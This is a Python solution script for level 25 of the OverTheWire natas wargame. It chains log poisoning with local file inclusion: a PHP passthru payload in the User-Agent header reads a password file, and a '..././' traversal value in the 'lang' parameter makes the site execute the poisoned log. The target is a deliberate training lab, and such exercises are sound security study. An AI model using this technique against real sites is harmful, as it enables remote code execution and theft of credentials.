import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def inject_payload():
    #Username and Password for natas website/level
    passw = subprocess.run(['getpass', '25'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    #Assign session id, static because that dictates where the log file will be stored
    phpid = 'tald'
    cookie = {'PHPSESSID':phpid}
    #The payload, injecting php into the user-agent field of the header (which is written into the log file where it can be executed)
    payload = "<?php print passthru('cat /etc/natas_webpass/natas26'); ?>"
    #Auth for level
    auth = HTTPBasicAuth('natas25', passw.strip())
    #Assigning the User-Agent to contain the payload
    header = {'User-Agent':payload}
    #Assigning the 'lang' field to navigate to the logfile (thereby executing the payload)
    getlog={'lang':'..././..././natas25/logs/natas25_' + phpid + '.log'}
    #Get request to website, creates object that contains a .text property
    #text property holds the html of the webpage
    r = requests.get('http://natas25.natas.labs.overthewire.org/', auth=auth, params=getlog, headers=header, cookies=cookie)
    passreg = '[a-zA-Z0-9]{32}'
    print(re.findall(passreg, r.text)[1])

if __name__ == "__main__":
    inject_payload()
